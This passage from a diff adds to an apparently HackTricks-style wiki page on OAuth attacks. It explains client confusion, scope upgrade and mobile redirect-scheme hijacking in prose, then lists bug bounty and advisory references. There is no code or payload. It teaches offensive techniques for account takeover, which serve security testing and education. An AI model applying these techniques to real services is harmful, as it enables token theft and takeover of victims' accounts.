+In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.<sup>[[4]](#references)</sup>
+
+## Scope Upgrade Attack
+
+The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.<sup>[[4]](#references)</sup>
+
+## Redirect Scheme Hijacking
+
+In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.<sup>[[4]](#references)</sup>
+
+## References
+
+- [1] [Leaking FXAuth token via allowlisted Meta domains](https://ysamm.com/uncategorized/2026/01/16/leaking-fxauth-token.html)
+- [2] [The wonderful world of OAuth (bug bounty edition)](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
+- [3] [Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
+- [4] [OAuth common vulnerabilities](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
+- [5] [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
+- [6] [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
+- [7] [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
+- [8] [Rapid7: CVE-2026-31381, CVE-2026-31382: Gainsight Assist Information Disclosure and Cross-Site Scripting (FIXED)](https://www.rapid7.com/blog/post/ve-cve-2026-31381-cve-2026-31382-gainsight-assist-information-disclosure-xss-fixed)
+- [9] [MDN: Window `pagereveal` event](https://developer.mozilla.org/en-US/docs/Web/API/Window/pagereveal_event)
+- [10] [The Most Dangerous OAuth Bug I’ve Ever Found](https://medium.com/@AliMojaver/the-most-dangerous-oauth-bug-ive-ever-found-a2af1275385c)
+- [11] [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
+- [12] [How I Found a Critical OAuth Misconfiguration That Led to Account Takeover](https://medium.com/@iamshafayat/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-abfec43eaea6)
+- [13] [Exploiting vulnerabilities in Johnson & Johnson web apps](https://eaton-works.com/2026/06/24/jnj-webapp-hacks/)
+- [14] [Access tokens in the Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/access-tokens)
+- [15] [Protected web API: Verify scopes and app roles](https://learn.microsoft.com/en-us/entra/identity-platform/scenario-protected-web-api-verification-scope-app-roles)
+- [16] [Account Takeover Chain – XSS in an OAuth redirect reflection](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html)
+- [17] [Account hijacking using "Dirty Dancing" in sign-in OAuth flows](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)
+- [18] [Flickr account takeover advisory](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)
+- [19] [Oh-Auth: Abusing OAuth to take over millions of accounts](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)
+- [20] [Why Electron apps can’t store your secrets confidentially](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
+- [21] [OAuth prompt=none and response_mode attack techniques (video)](https://www.youtube.com/watch?v=n9x7_J_a_7Q)
+- [22] [A bypass on GitLab’s login email verification via OAuth ROPC flow](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96)
+- [23] [OAuth Non-Happy Path to ATO](https://blog.voorivex.team/oauth-non-happy-path-to-ato)
+- [24] [RFC 6749 – The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
+
+{{#include ../banners/hacktricks-training.md}}
